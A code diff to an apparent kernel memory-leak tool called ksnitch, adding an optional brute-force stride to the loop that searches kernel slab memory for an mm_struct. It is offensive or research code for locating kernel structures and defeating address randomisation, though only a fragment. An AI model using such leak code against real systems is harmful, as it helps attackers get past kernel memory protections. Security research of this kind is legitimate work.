@@ -215,6 +215,11 @@ static void *__mm_leak(void *arg)
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
+#ifdef KSNITCH_BRUTEFORCE_STRIDE
+    size_t bf_stride = KSNITCH_BRUTEFORCE_STRIDE;
+#else
+    size_t bf_stride = ks->mm_struct_sz;
+#endif
     for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
@@ -223,16 +228,21 @@ static void *__mm_leak(void *arg)
         if (ks->exact_identity_partition && coarse_end > range->end)
             coarse_end = range->end;
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_end) && !ks->found; slab_addr += mm_slab_sz) {
+#ifdef KSNITCH_BRUTEFORCE_STRIDE
+            size_t first_candidate = slab_addr;
+            size_t candidate_end = slab_addr + mm_slab_sz;
+#else
             size_t first_candidate =
                 slab_addr + ks->min_object_index * ks->mm_struct_sz;
             size_t candidate_end =
                 slab_addr + (ks->max_object_index + 1) * ks->mm_struct_sz;
             if (candidate_end > slab_addr + mm_slab_sz)
                 candidate_end = slab_addr + mm_slab_sz;
-            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+#endif
+            for (size_t mm_struct_candidate = first_candidate; (mm_struct_candidate < candidate_end) && !ks->found; mm_struct_candidate += bf_stride) {
 #else
         for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += bf_stride) {
 #endif
 
                 size_t found_hash = 1;
